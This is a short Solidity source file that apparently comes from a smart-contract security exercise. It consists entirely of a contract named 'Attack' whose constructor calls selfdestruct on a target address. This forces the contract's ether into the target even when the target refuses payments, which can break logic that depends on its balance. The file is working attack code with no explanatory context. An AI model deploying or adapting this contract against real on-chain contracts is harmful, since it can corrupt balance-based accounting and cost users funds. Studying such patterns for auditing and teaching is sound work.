// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}
